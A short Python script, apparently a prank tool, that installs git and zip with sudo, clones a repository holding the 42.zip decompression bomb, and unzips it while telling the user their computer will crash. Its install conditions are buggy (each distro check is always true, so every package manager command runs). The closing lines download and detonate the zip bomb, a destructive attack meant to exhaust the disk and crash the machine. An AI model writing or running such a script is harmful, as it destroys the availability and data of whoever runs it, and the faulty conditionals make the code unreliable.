import time
import os

askdistro = input("Yo, what distro you got? (debian, arch, fedora)")
askgit = input("You got git? (Y/N)")
askzip = input("You got Zip? (Y/N)")

if askdistro == "Debian" or "debian" and askgit == "N" or "n":
    os.system("sudo apt install git -y")

if askdistro == "Debian" or "debian" and askzip == "N" or "n":
    os.system("sudo apt install zip unzip -y")


if askdistro == "Arch" or "arch" and askgit == "N" or "n":
    os.system("sudo pacman -S git --noconfirm")

if askdistro == "Arch" or "arch" and askzip == "N" or "n":
    os.system("sudo pacman -S zip unzip --noconfirm")


if askdistro == "Fedora" or "fedora" and askgit == "N" or "n":
    os.system("sudo dnf install git -y")

if askdistro == "Fedora" or "fedora" and askzip == "n" or "N":
    os.system("sudo dnf install zip unzip -y")

# os.system("echo hello, world!")


print("Ok now I'm gonna install the zip bomb...")

os.system("git clone https://github.com/iamtraction/ZOD.git")

print("Yeah brother this is gonna crash your system...")

time.sleep(1)
print(".", end=" ")
time.sleep(1)
print(".", end=" ")
time.sleep(1)
print(".", end=" ")

print("Ok brother say bye to your computer...")
os.system("unzip -o -P 42 42.zip")




